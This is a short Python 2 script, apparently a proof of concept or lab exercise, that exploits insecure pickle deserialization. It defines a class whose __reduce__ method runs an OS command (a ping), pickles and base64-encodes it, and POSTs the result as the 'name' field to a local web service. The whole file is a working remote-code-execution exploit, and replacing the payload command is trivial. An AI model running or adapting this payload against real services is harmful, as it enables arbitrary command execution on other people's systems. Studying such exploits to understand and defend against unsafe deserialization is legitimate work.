import base64
import os
import cPickle
import requests


class Exploit(object):
    def __reduce__(self):
        return (os.system, ("ping 192.168.0.2",))

shellcode = base64.b64encode(cPickle.dumps(Exploit()))
print shellcode

requests.post('http://127.0.0.1:5000/', data={"name": str(shellcode)})






